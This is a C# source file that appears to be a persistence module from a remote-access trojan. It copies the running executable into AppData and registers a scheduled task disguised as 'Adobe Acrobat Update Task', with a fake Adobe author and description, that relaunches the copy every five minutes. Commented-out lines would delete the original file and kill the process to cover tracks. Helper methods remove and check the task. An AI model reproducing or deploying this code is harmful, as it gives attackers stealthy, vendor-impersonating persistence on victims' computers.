using Microsoft.Win32.TaskScheduler;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;

namespace Plugin.Handler
{
    class HandleSchtaskInstall
    {
        public static string Author = "Adobe Scheduler";
        public static string Description = "This task keeps your Adobe Reader and Acrobat applications up to date with the latest enhancements and security fixes";
        public static string Task = "Adobe Acrobat Update Task";
        public static void AddStartUp()
        {
            try
            {
                Process processes = Process.GetCurrentProcess();
                string name = processes.ProcessName + ".exe";
                try 
                {
                    string filepath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), name);
                    File.Copy(Process.GetCurrentProcess().MainModule.FileName, filepath, true);
                } 
                catch
                {
                    string filepath = Path.Combine(Path.GetTempPath(), name);
                    File.Copy(Process.GetCurrentProcess().MainModule.FileName, filepath, true);
                }                
                TaskService ts = new TaskService();
                TaskDefinition td = ts.NewTask();
                td.RegistrationInfo.Description = Description;
                td.RegistrationInfo.Author = Author;
                TimeTrigger dt = new TimeTrigger();
                dt.StartBoundary = Convert.ToDateTime(DateTime.Now.ToString("yyyy-MM-dd 06:30:00"));
                dt.Repetition.Interval = TimeSpan.FromMinutes(5);
                td.Triggers.Add(dt);
                td.Settings.DisallowStartIfOnBatteries = false;
                td.Settings.RunOnlyIfNetworkAvailable = true;
                td.Settings.RunOnlyIfIdle = false;
                td.Settings.DisallowStartIfOnBatteries = false;
                td.Actions.Add(new ExecAction(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), name), "", null));
                ts.RootFolder.RegisterTaskDefinition(Task, td);

                //运行后自杀
                //string s = Process.GetCurrentProcess().MainModule.FileName;
                //Process.Start("Cmd.exe", "/c del " + "\"" + s + "\"");
                //Process.GetCurrentProcess().Kill();
            }
            catch (Exception ex)
            {
                Packet.Error(ex.Message);
            }

        }
        public static void DelStartUp()
        {
            try
            {
                using (TaskService _taskService = new TaskService())
                {
                    _taskService.RootFolder.DeleteTask(Task, false);
                }
            }
            catch (Exception ex)
            {
                Packet.Error(ex.Message);
            }

        }

        public static bool GetStartUp()
        {
            try
            {
                TaskCollection taskCollection;
                using (TaskService _taskService = new TaskService())
                {
                    taskCollection = _taskService.RootFolder.GetTasks(new Regex(Task));
                }
                if (taskCollection.Count != 0)
                {
                    return true;
                }
                else 
                {
                    return false;
                }
            }
            catch (Exception ex)
            {
                Packet.Error(ex.Message);
                return false;
            }

        }
    }
}
